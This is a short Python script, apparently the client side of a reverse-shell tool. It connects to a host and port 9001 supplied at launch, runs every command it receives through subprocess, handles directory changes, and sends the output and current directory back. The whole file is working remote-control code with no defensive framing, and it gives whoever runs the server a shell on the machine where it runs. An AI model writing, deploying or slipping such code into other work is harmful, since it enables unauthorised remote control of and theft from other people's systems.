import socket
import os
import sys
import subprocess

# same suggestions as in server
CONNECT_ADDRESS = sys.argv[1]
CONNECT_PORT = 9001
MESSAGE_SIZE = 1024 * 128

SEPERATOR = '<sep>'

s = socket.socket()

s.connect((CONNECT_ADDRESS, CONNECT_PORT)) # connect to server

cwd = os.getcwd() # get cwd
s.send(cwd.encode()) # send cwd for initial message

while True:
    cmd = s.recv(MESSAGE_SIZE).decode() # recieve command from server
    split_cmd = cmd.split()
    if cmd.lower() == "exit":
        break

    if split_cmd[0].lower() == "cd": # handle cd command
        try:
            os.chdir(' '.join(split_cmd[1:])) # join all other parts of the command
        except Exception as e: # handle exceptions
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(cmd) # execute any other commands using subprocess

    cwd = os.getcwd() # get cwd after executing command

    results = f"{output}{SEPERATOR}{cwd}" # package cwd with cmd output
    s.send(results.encode()) # send packaged message

s.close() # close connection